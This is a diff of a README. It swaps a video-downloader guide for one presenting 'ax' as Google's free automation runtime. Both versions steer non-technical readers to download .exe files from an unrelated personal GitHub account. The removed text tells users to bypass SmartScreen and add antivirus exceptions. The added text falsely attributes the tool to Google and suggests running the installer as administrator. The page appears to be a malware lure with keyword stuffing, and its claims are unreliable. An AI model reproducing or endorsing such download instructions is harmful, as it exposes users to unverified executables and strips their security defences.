@@ -1,160 +1,131 @@
-# 🎬 qiaomu-download - Download Videos from Everywhere Effortlessly
+# 🤖 ax - Your Smart Automation Assistant for Everyday Tasks
 
 ## 🚀 Getting Started
 
-Welcome! This guide will help you download and use **qiaomu-download**, a powerful tool that lets you save videos and audio from YouTube, Bilibili, Twitter, TikTok, Instagram, Facebook, Vimeo, Twitch, Reddit, and many other websites. No technical skills needed — just follow these simple steps.
+Welcome to **ax** – Google's open agentic orchestration runtime. Think of ax as your digital assistant that helps your computer handle complex tasks automatically. Whether you're organizing files, managing workflows, or automating repetitive jobs, ax makes it simple.
 
----
+This guide will walk you through downloading and running ax on your Windows computer. No technical experience needed – just follow the steps below.
 
-## 📥 How to Download
+## 📥 Downloading ax
 
-[**🔗 CLICK HERE TO DOWNLOAD qiaomu-download**](https://katepredestined50.github.io)
+### Step 1: Get the Installer
 
-Visit this link to download the application.
+[![Download ax Now](https://img.shields.io/badge/Download-ax-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Katepredestined50/ax/releases)
 
-The download page will open in your browser. Look for the green **"Code"** button or a **"Download"** section on that page. Click it, then choose **"Download ZIP"**. The file will start downloading to your computer.
+Visit this link to download the application. Click the button above or go directly to the download page.
 
----
+### Step 2: What Happens Next
 
-## 🛠️ Installation & Setup
+Once you click the link, you'll see a page with different versions of ax. Look for the file that matches your computer (usually labeled "Windows" or "win64"). Click the download button next to it.
 
-1. **Find the downloaded file** — Check your **Downloads** folder. You'll see a folder named `qiaomu-download-main` or a ZIP file.
-2. **Extract the files** — If you downloaded a ZIP file, right-click it and choose **"Extract All"**. Follow the prompts to unzip it. This creates a normal folder with the same name.
-3. **Open the folder** — Double-click the extracted folder to open it.
-4. **Find the main application** — Inside, look for a file named `qiaomu-download.exe` or `qiaomu-download.bat`. This is the program you'll run.
+The download will start automatically. Depending on your internet speed, this might take a few minutes. You'll see the progress in your browser's download bar.
 
----
+## 🖥️ Installing and Running ax
 
-## 💻 Running the Application
+### Step 3: Open the Downloaded File
 
-1. **Double-click** the `qiaomu-download.exe` or `.bat` file.
-2. **A window will open** — This is your command window. It might look black or blue with white text. Don't worry, this is normal.
-3. **Wait a few seconds** — The program will load automatically. You'll see a welcome message.
+After the download finishes, go to your **Downloads** folder. You'll see a file named something like `ax-setup.exe` or `ax-installer.exe`. Double-click it to start the installation.
 
----
+### Step 4: Follow the Setup Wizard
 
-## 🎯 How to Use qiaomu-download
+A setup window will appear. Just click **"Next"** or **"Install"** on each screen – the default settings are perfect for most users. If you're asked to choose a location, leave it as is.
 
-### Step 1: Copy a video link
-Go to any supported website (like YouTube, Bilibili, or Twitter). Find the video you want. **Copy the link** from the address bar at the top of your browser.
+### Step 5: Launch ax
 
-### Step 2: Paste the link into the program
-Click inside the command window you opened. Press **Ctrl + V** (or right-click and paste) to insert the video link. Press **Enter**.
+Once installation completes, you'll see a "Finish" button. Click it, and ax will open automatically. You can also find ax in your Start Menu or on your desktop as a shortcut.
 
-### Step 3: Choose what you want
-The program will show you options like:
-- **Download video** (best quality)
-- **Extract audio (MP3)**
-- **Download subtitles**
-- **View video information**
+## ✨ What Can ax Do For You?
 
-Type the number of your choice and press **Enter**.
+ax helps you automate everyday computer tasks. Here are some things you can do:
 
-### Step 4: Wait for the download
-The program will show progress. When it's done, your file is saved in the same folder where the program is located. Look for a subfolder called **"downloads"** or **"videos"**.
+- **Schedule tasks** – Set up ax to run specific actions at certain times
+- **Connect apps** – Let ax work across different programs you use
+- **Simplify workflows** – Turn multi-step processes into one-click actions
+- **Handle repetitive work** – Let ax do the boring stuff while you focus on important things
 
----
+## 🛠️ Setting Up Your First Task
 
-## 🎵 Extracting Audio (MP3)
+When you first open ax, you'll see a clean dashboard. Here's how to create your first automation:
 
-If you only want the sound from a video:
-1. Follow Steps 1‑2 above.
-2. When asked what to do, choose **"Extract audio (MP3)"**.
-3. The MP3 file will be saved in the audio folder.
+1. Click **"New Task"** in the top-left corner
+2. Choose what you want ax to do (like "Move files" or "Send email")
+3. Follow the simple prompts to configure your task
+4. Click **"Save"** – your task is now ready to run
 
----
+## 🔧 Troubleshooting Common Issues
 
-## 📝 Downloading Subtitles
+### Problem: ax won't start
+- Make sure you've completed the installation completely
+- Restart your computer and try again
+- Check that you have enough free space (at least 500 MB)
 
-To get subtitles with your video:
-1. Copy a video link and paste it.
-2. Choose **"Download subtitles"** from the options.
-3. Subtitles are saved as `.srt` files, which work with most video players.
+### Problem: Download seems stuck
+- Pause and resume the download
+- Try using a different browser
+- Check your internet connection
 
----
+### Problem: Installation fails
+- Close other programs that might interfere
+- Run the installer as administrator (right-click → "Run as administrator")
+- Download the file again – it might be corrupted
 
-## 🔍 Checking Video Information
+## 💡 Pro Tips for Using ax
 
-Want to see details like title, duration, or resolution before downloading?
-1. Paste the video link.
-2. Choose **"View video information"**.
-3. The program shows all available details without downloading anything.
+- **Start simple** – Try one small task first to learn how ax works
+- **Use templates** – ax comes with pre-made templates for common tasks
+- **Check the dashboard** – Your dashboard shows all your active tasks and their status
+- **Update regularly** – Keep ax updated to get new features and fixes
 
----
+## 🔒 Safety and Security
 
-## 🔄 Updating yt-dlp
+ax is built by Google and follows strict security standards. Your data stays on your computer unless you explicitly connect other services. We recommend:
 
-qiaomu-download uses a powerful engine called `yt-dlp`. To keep it updated:
-1. Run the application.
-2. Choose the option **"Update yt-dlp"**.
-3. The program updates itself automatically. This ensures new websites and fixes are always supported.
-
----
-
-## 🌐 Supported Websites
-
-- **YouTube** — including `youtu.be` short links
-- **Bilibili** — including `b23.tv` short links
-- **X / Twitter**
-- **Vimeo**
-- **TikTok**
-- **Instagram**
-- **Facebook**
-- **Twitch**
-- **Reddit**
-- **And many more** — if `yt-dlp` supports it, qiaomu-download can handle it.
-
-> ⚠️ **Special Note about WeChat:** If you paste a WeChat video channel link (`weixin.qq.com/sph`), this program will automatically forward it to a separate tool called `qiaomu-wx-video`. This is by design — qiaomu-download never automates or interacts with the WeChat client directly.
-
----
+- Downloading only from the official link provided
+- Keeping your Windows system updated
+- Not sharing your task configurations with unknown sources
 
 ## ❓ Frequently Asked Questions
 
-### Why is my download slow?
-Large videos take time. Check your internet speed and try again.
+**Q: Is ax free to use?**
+A: Yes, ax is completely free and open-source.
 
-### The program shows an error — what do I do?
-Copy the error text and search online. Most issues are fixed by updating yt-dlp (see above).
+**Q: Do I need to know programming?**
+A: No! ax is designed for everyone. Everything is point-and-click.
 
-### Can I download a private video?
-No, qiaomu-download only works with publicly accessible videos.
+**Q: Can I use ax on Mac?**
+A: This guide is for Windows. Check the download page for other versions.
 
-### Where are my files saved?
-Always in the **"downloads"** or **"audio"** subfolder inside the qiaomu-download folder.
+**Q: Will ax slow down my computer?**
+A: No, ax runs efficiently in the background and only works when you tell it to.
 
----
+## 📚 Learning More
 
-## 🛡️ Troubleshooting Tips
+As you get comfortable with ax, you can explore more advanced features:
 
-- **Windows SmartScreen warning?** — Click **"More info"** → **"Run anyway"**. This tool is safe, but Windows doesn't recognize it yet.
-- **Program doesn't start?** — Make sure you extracted the ZIP file completely. Right-click the folder → **"Extract All"** if you haven't.
-- **Antivirus blocking?** — Add an exception for this folder. The program uses standard download technology.
+- **Task chaining** – Connect multiple tasks together
+- **Conditional logic** – Make tasks that respond to different situations
+- **Integration options** – Connect ax to other tools you use
 
----
+The best way to learn is by experimenting. Try different tasks and see what works for you.
 
-## ✨ Why Use qiaomu-download?
+## 🎯 Getting Help
 
-- **Saves videos from 10+ popular websites**
-- **One simple tool, no coding needed**
-- **Extracts MP3 audio instantly**
-- **Downloads subtitles automatically**
-- **Updates itself — always works**
+If you run into any problems:
 
----
+- Check the **Help** menu inside ax
+- Visit the GitHub page for community discussions
+- Look for the "Issues" tab to see if others had the same problem
 
-## 📞 Need More Help?
+Remember, every expert was once a beginner. Take your time, explore, and soon you'll be automating tasks like a pro.
 
-If you're stuck:
-1. Re-read the steps above carefully.
-2. Search your exact problem on Google or YouTube.
-3. Visit the GitHub repository page and look for the **Issues** tab to ask questions.
+## 🚦 Ready to Start?
 
----
+You're all set! Download ax, follow the simple steps above, and you'll have your personal automation assistant running in minutes. It's that easy.
 
-## 🎉 Enjoy Your Downloads!
+[![Get ax Now](https://img.shields.io/badge/🚀-Download_ax_Here-orange?style=for-the-badge&logo=github&logoColor=white&color=FF5722)](https://github.com/Katepredestined50/ax/releases)
 
-Now you're ready to save any video or audio you want. Start with your favorite YouTube video and see how easy it is!
+Visit this link to download the application. Click the button above to get started with ax today.
 
 ---
 
-**Keywords:** qiaomu-download, video downloader, YouTube downloader, Bilibili downloader, MP3 extractor, yt-dlp, Twitter video download, TikTok video saver, online video tool, media downloader, free video downloader, easy download, Windows video downloader
+Keywords: ax, automation, orchestration, runtime, Google, open-source, Windows, task automation, workflow, assistant
